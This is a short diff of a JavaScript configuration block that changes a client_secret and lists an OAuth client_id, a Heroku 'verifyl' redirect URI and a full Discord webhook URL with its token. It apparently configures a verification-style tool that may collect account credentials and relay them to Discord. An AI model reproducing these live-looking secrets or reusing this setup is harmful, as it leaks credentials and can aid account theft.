@@ -1,5 +1,5 @@
 // Configuration
-const client_secret = '-3c618145-7617-4417-94b9-84e736a46e78'
+const client_secret = 'Uso8Q~DuunkVyQ56Dg3qwRVUmHTt-WJpEG-5lci0'
 const client_id = '54cc7c82-9f89-4723-8932-8e4852b284ba'
 const redirect_uri = 'https://verifyl.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1048528161211691088/_Tfbb9Oii-L_I_Ou_w_eSD7nzmp-A9KH_R94lWVvNrc2s9yOSPuy7HyOwEavgPZF3mf6'
